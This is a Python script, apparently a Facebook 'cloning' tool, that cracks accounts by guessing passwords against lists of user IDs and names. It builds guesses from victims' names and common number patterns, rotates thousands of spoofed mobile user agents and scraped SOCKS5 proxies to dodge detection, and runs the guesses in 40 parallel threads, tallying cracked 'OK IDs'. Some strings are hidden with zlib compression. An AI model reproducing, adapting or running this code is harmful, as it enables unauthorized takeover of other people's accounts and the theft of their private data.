"""
@ Reverse By : R_Fuxer
@ Supported By : Ahmed Ali
@ Follow Our Github : Ahmed-xd
"""
import os,zlib,uuid,json
import sys
import random
import string
import time
import re
from os import system as _DEVIL_
from concurrent.futures import ThreadPoolExecutor as ThreadPool
rc=random.choice
rn=random.randint
try:
    import gtts
except:
    _DEVIL_("python3 -m pip install gtts")
    import gtts
def create_audio(text,file):
    from gtts import gTTS
    my_a = gTTS(text)
    my_a.save(file)
try:
    os.mkdir("database")
except:pass
 ######[PLAY_AUDIO]#####
def play_audio(audio_file):
    from os import system as cmd
    try:
        cmd("play-audio "+audio_file)
    except:
        pass
def dual(text,file):
    create_audio(text,file)
    play_audio(file) 


try:
    import requests
except:
    _DEVIL_("pip uninstall requests -y")
    _DEVIL_("python3 -m pip install requests")
    import requests
try:
    import bs4
    from bs4 import BeautifulSoup as mahi
except:
    os.system("pip install bs4")
    import bs4
    from bs4 import BeautifulSoup as mahi
from requests.exceptions import ConnectionError
from datetime import datetime 
ct=str(datetime.now())
pros=ct.split(" ")[1]
jf=pros.split(".")[0]
rt=jf.split(":")[0]
rt2=jf.split(":")[1]
if int(rt) > 12:
    xt=int(rt)-12
    ct=str(xt)+":"+rt2
    no="PM"
else:
    ct=rt+":"+rt2
    no="AM"
_DEVIL_("clear")
print(" [✓] JOIN MESSENGER GROUP")
#_DEVIL_("xdg-open https://m.me/j/AbbDE8cPzZJg84pm/")
oks=[]
cps=[]
loop=0
cdoen=[]
def results():
    if len(oks) <1:
        print("\r\r\033[1;97m[\033[38;5;196m~\x1b[0m] THIS MATHOD IS NOT WORKING AT NOW")
        print("\033[1;97m[\033[38;5;196m~\x1b[0m] USE ANOTHER MATHOD FOR OK ID'S !!")
    if len(oks) >0:
        line()
        print("\033[1;97m[\033[38;5;196m~\x1b[0m] REVIEW ON FB-GROUP AND POST SS")
        print("\033[1;97m[\033[38;5;196m~\x1b[0m] THANKS FOR USE THE TOOL  _🐼🍁 ")
    line()
    print("\033[1;97m[\033[2;92m✓\x1b[0m] \033[1;97mCRACK WAS COMPLETED ")
    print(f"\033[1;97m[\033[2;92m✓\x1b[0m] \033[1;97mTOTAL OK IDS: \033[2;92m{str(len(oks))}")
    print("\x1b[0m\033[1;97m[\033[2;92m✓\x1b[0m] \033[1;97mUSE \033[7;97mctrl+z\x1b[0m FOR EXIT")
    line()
    again=input("\033[1;97m[!]\x1b[0m \033[38;5;46mPRASS ENTER FOR CRACK AGAIN")
    if len(oks) <1:
        menu()
    if len(oks) >0:
        Review()

mama=["Mozilla/5.0 (Linux; Android 10; Infinix X688B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/296.0.0.44.119;]","Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/356.0.0.7.89;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/el_GR;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.86 Mobile Safari/537.36[FBAN/EMA;FBLC/az_AZ;FBAV/227.0.0.5.115;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/217.0.0.45.98;]","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/214.0.0.43.83;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/194.0.0.42.99;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/lv_LV;FBAV/224.0.0.9.117;]","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/223.0.0.11.121;]","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/287.0.0.22.120;]"]
cpp=["stay with BOB MARLEY","GANJA","pot","joint"]
co=["\033[38;5;46m","\033[38;5;196m","\033[1;96m","\033[2;97m","\033[1;94m"]
c2=["\x1b[38;5;208m","\033[38;5;46m","\033[2;93m","\033[2;97m","\033[1;97m"]

co1=["\033[38;5;46m","\033[1;91m","\033[1;95m","\033[1;97m","\033[1;94m","\033[1;93m"]
link=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5w2p\xd2\xf5u\x0c\xf2q\x8d\xd4ww\xf4\xf3r\xd4O\xca\xc9O\xd2\xcfM\xcc\xcc\xd3\xd7+H\xccL\xd1+\xa9(\x01\x00\x00\xd2\x12Q')
bg=["\033[47m","\033[42m","\033[43m","\033[45m"]

w=str(zlib.decompress(b'x\x9c3141535\xb70\x03\x00\t<\x01\xdf'))
passw=w.split("b")[1]
domain="@gmail.com"
#u=open("agent.txt","r").read().splitlines()

spok=["congratulations","supprise","ok id","successful","alive"]
#-----------[++]
ugen=[]
ugen2=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 7S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uaku2)
    

    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 11; SAMSUNG SM-A515F'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uaku2)
   
for ua in range(50000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
#-----------[++]
def clear():
    _DEVIL_("clear")
unlimited=9999999999999999999999999999999999999999999999999999
def tahunng(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = '•(2009'
        elif fx[:9] in ['100000000']       :tahunz = '•(2009'
        elif fx[:8] in ['10000000']        :tahunz = '•(2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '•(2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '•(2010'
        elif fx[:6] in ['100001']          :tahunz = '•(2010-2011'
        elif fx[:6] in ['100002','100003'] :tahunz = '•(2011-2012'
        elif fx[:6] in ['100004']          :tahunz = '•(2012-2013'
        elif fx[:6] in ['100005','100006'] :tahunz = '•(2013-2014'
        elif fx[:6] in ['100007','100008'] :tahunz = '•(2014-2015'
        elif fx[:6] in ['100009']          :tahunz = '•(2015'
        elif fx[:5] in ['10001']           :tahunz = '•(2015-2016'
        elif fx[:5] in ['10002']           :tahunz = '•(2016-2017'
        elif fx[:5] in ['10003']           :tahunz = '•(2018'
        elif fx[:5] in ['10004']           :tahunz = '•(2019'
        elif fx[:5] in ['10005']           :tahunz = '•(2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = '•(2021-2022'
        else:tahunz='•(2023'
    elif len(fx) in [9,10]:
        tahunz = '•(2008-2009'
    elif len(fx)==8:
        tahunz = '•(2007-2008'
    elif len(fx)==7:
        tahunz = '•[2006-2007'
    else:tahunz='•[2023'
    return tahunz


def line():
    print("\r\x1b[0m\033[1;90m———————————————————\033[1;97m———————————————————\x1b[0m")
    
#-------------}}}}}
fic=open(".fic.txt","a").write("tq\n")
sz=open(".fic.txt","r").read().splitlines()


#-------------}}}}}
logo=(f"""
\033[1;92m\033[38;5;46m   .aMMMMP .aMMMb  dMMMMb dMMMMMP .aMMMb  \033[3;97m\x1b[38;5;208m«\033[2;97m〈 \033[38;5;46m\033[38;5;196mrank {len(sz)}\x1b[0m
\033[1;97m  dMP"    dMP"dMP dMP dMP    dMP dMP"dMP 
\033[1;92m\033[38;5;46m dMP MMP"dMMMMMP dMP dMP    dMP dMMMMMP  \033[3;97m\x1b[38;5;208m«\033[2;97m〈  \033[1;97m\033[38;5;46m\033[38;5;196m{ct} {no}\x1b[0m
\033[1;97mdMP.dMP dMP dMP dMP dMPdK .dMP dMP dMP  
\033[1;92m\033[38;5;46mVMMMP" dMP dMP dMP dMP VMMMP" dMP dMP \033[47m \033[1;90mUPDATE \033[38;5;196m9.6 \033[38;5;46m[✓] \x1b[0m
\033[1;90m——————————————————————————————————————
 \033[47m\033[38;5;196m 𝘽 \x1b[0m \033[3;93m\033[2;94m\033[38;5;196mDEVELOPER\x1b[0m     \033[2;93m:\x1b[0m \033[3;93m\033[2;94m\033[38;5;196mHERON AFRIDI\x1b[0m
 \033[47m\033[38;5;196m 𝙊 \x1b[0m \033[2;97mGITHUB\x1b[0m        \033[2;93m:\x1b[0m \033[2;97mB0B-MARLEY\x1b[0m
 \033[47m\033[38;5;196m 𝘽 \x1b[0m POWER BY      \033[2;93m:\x1b[0m \033[2;93m\033[9;94m\033[7;90mTAMAK PATA🍁\x1b[0m
\033[1;90m——————————————————————————————————————""")

#-----USER AGENT 
try:
    rfg=requests.get("https://raw.githubusercontent.com/B0B-MARLEY/database/main/agent.txt").text
except:
    print(" [+] INTERNET CONNECTION ERROR")
    sys.exit()
open('.agent.txt','w').write(rfg) 
heron=open(".agent.txt","r").read().splitlines()

#----PROXY

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

#-----------))))+((((
def music():
    _DEVIL_("play-audio m1.mp3")
    _DEVIL_("play-audio m2.mp3")
    _DEVIL_("play-audio m3.mp3")
    music()
def Review():
    clear()
    print(logo)
    print(' \033[38;5;46m[1] REVIEW 0N FACEB00K GR0UP')
    print(' [2] REVIEW 0N MESSENGER B0X')
    print(' [3] \033[38;5;196mMENU');line()
    review=input(" \033[1;97m[✓] Choose:")
    if review in ['1']:
        os.system("xdg-open https://facebook.com/groups/1181722475509853/")
        menu()
    if review in ['2']:
        os.system("xdg-open https://m.me/j/AbYSb25cbLdkywNd/")
        menu()
    if review in ['3']:
        menu()
    Review()
def file_iclone():
    clear()
    print(logo)
    fl=input(" Input File Path:")
    try:
        file=open(fl,"r").read().splitlines()
        
    except:clear();print(" File Does not found");time.sleep(2);file_iclone()
    
    auto_pass(file)
    

def auto_pass(file):
    clear()
    print(logo)
    print("\033[1;97m [1] Mathod GRAPH")
    print(" [2] Mathod API")
    math=input(" [✓] choose:")
    if math in["1","01"]:
        aaa="1"
    else:aaa="2"
    clear()
    print(logo)
    print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
    print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
    line()   
    with ThreadPool (max_workers=40) as feel:
        for data in file:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append("57273200")
            pwx.append("57575751")
            pwx.append("59039200")
            pwx.append('203040')
            pwx.append('506070')
            pwx.append('708090')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(name1+"123")
                    pwx.append(name1+"1234")
                    pwx.append(name1+"@#")
                    pwx.append(name1+"@@")
                    pwx.append(name1+"@123")
                    pwx.append(name1+"@1234")
                    pwx.append(name1+"@12345")
                    pwx.append(name1+"12345")
            except:pass
            try:
                mid_name=name.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+"123")
                    pwx.append(name1+" "+mid_name)
            except:pass
            try:
                sur_name=name.split(" ")[2]
                if len(sur_name) <3:
                    pwx.append(name)
                else:
                    pwx.append(sur_name+'123')
                    
            except:pass
            if aaa in ["1"]:
                feel.submit(b_grap,uid,pwx)
            else:feel.submit(B_Api,uid,pwx)

    results()

def menu():
    clear()
    print("\x1b[0m FOLLOW FB-GROUP")
  #  _DEVIL_("xdg-open https://www.facebook.com/groups/1181722475509853/?ref=share")
    clear()
    print(logo)
    #print(' \033[1;97m[\033[38;5;46m✓\033[1;97m] USER-ID: \033[38;5;46m'+id)
    print(f' \033[1;97m[\033[38;5;46m✓\033[1;97m] YOUR PROFILE RANK: \033[38;5;46m{str(len(sz))} score');line()
    print(" \x1b[38;5;208m[\033[38;5;46mA\x1b[38;5;208m] \033[2;97mMix Number Clone \x1b[0m  ")
